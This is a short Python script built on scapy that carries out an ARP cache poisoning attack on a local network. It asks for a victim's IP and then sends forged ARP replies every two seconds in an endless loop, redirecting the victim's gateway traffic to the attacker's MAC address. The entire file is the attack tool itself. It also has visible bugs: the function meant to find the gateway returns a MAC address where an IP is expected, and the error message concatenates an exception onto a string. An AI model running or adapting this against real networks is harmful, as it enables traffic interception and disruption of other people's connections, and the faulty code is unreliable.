from scapy3k.all import *
import time


def poison_arp(victim_ip: str, default_gateway_ip: str, host_mac_address: str) -> None:
    """
    Makes an ARP attack with the specified parameters.
    :param victim_ip: The PC to spoil
    :param default_gateway_ip: IP of the dg provided by DHCP.
    :param host_mac_address: mac address of the PC that will get the transmission.
    :return:
    """
    packet = Ether() / ARP()
    packet[Ether].dst = 'ff:ff:ff:ff:ff:ff'  # Broadcast to all PC on the LAN
    packet[ARP].psrc = default_gateway_ip  # Like it came from the gateway
    packet[ARP].op = 2  # Reply op type ("is-at")
    packet[ARP].pdst = victim_ip  # Target the falsified ARP packet to the victim pc.

    packet[ARP].hwsrc = host_mac_address  # The victim PC needs to know which MAC to send to as the "default gateway"
    packet[ARP].hwdst = 'ff:ff:ff:ff:ff:ff'  # Broadcast to all PCs on LAN
    packet.show()  # Print the packet just in-case
    sendp(packet)  # Send w/o expecting a response


def send_spoofed(packet: Packet):
    send(packet)


def get_default_gateway() -> str:
    p = srp1(Ether()/IP(dst="google.com", ttl=0) / ICMP() / "lorem", verbose=1)
    return p[Ether].src  # This works because the first hop is our router.


def get_mac_address() -> str:
    """Gets the host PCs mac address on the wanted interface."""
    my_interfaces = get_if_list()
    print("\n".join([f"{num}: {interf}" for num, interf in enumerate(my_interfaces)]))
    interface = my_interfaces[int(input("Choose an interface:"))]

    return get_if_hwaddr(interface)


def main():
    default_gateway = get_default_gateway()
    print(default_gateway)
    try:
        my_mac_address = get_mac_address()

    except Exception as mac_e:
        my_mac_address = input("Auto-detection failed.\n"
                               "Please use the format aa:bb:cc:dd:ee:ff.\nYour MAC: ")
        print("Error: " + mac_e)

    victim_pc = input("Victim PC IP: ")

    print("Bombing victim PC with ARP replies..")
    try:
        while True:
            poison_arp(victim_pc, default_gateway, my_mac_address)
            time.sleep(2)
    except KeyboardInterrupt:
        print("Stopped bombing")


if __name__ == '__main__':
    main()